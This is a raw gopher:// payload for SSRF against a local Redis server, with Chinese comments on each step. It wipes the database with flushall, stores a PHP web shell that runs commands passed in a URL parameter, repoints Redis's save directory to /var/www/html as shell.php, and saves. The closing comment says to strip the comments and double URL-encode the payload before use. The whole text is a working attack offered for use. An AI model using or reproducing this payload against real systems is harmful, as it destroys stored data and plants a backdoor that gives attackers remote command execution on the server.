gopher://127.0.0.1:6379/_*1
$8
flushall                      #这里是清空缓存
*3
$3
set
$1                            #这里无所谓
1
$34


<?php system($_GET['cmd']); ?>


*4
$6
config
$3
set
$3
dir
$13
/var/www/html                             #这里是目录
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*1
$4
save                                            #记得把注释删除，然后之后把脚本二次url编码。